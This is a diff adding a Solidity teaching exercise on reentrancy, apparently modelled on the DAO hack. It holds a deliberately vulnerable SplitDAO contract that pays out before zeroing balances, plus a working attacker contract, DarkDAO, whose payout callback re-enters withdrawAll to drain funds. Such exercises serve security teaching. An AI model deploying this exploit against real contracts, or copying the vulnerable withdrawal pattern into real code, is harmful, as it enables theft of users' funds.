@@ -1,0 +1,67 @@
+pragma solidity ^0.4.18;
+
+/* CAN YOU SPOT THE VULNERABILITY? */
+contract SplitDAO {
+    
+    mapping(address=>uint) balances;
+    
+    function withdrawAll() {
+        
+        uint fundsToBeMoved = balances[msg.sender];
+        DarkDAO pocket = DarkDAO(msg.sender);
+        pocket.payout.value(fundsToBeMoved)();
+        balances[msg.sender] = 0;
+    
+    }
+    
+    function getBalance() constant returns (uint) {
+        return this.balance;
+    }
+    
+    function donate() payable {
+        balances[msg.sender] += msg.value;
+    }
+    
+    function() payable {}
+    
+}
+
+
+
+
+/* The attacker's smart contract */
+contract DarkDAO {
+    
+    SplitDAO vulnaccount;
+    
+    function DarkDAO(address daoaddress) {
+        vulnaccount = SplitDAO(daoaddress);
+    }
+    
+    function donate(uint amount) {
+        vulnaccount.donate.value(amount)();
+    }
+    
+    function withdraw() {
+        vulnaccount.withdrawAll();
+    }
+    
+    function getBalance() constant returns (uint) {
+        return this.balance;
+    }
+    
+    /* THE EXPLOIT IS TOO EASY */
+    uint n = 10;
+    function payout() payable {
+        
+        /* What could we put here??? */
+        if (n > 0) {
+            n--; 
+            vulnaccount.withdrawAll();
+        }
+            
+    }
+    
+    function() payable {}
+    
+}
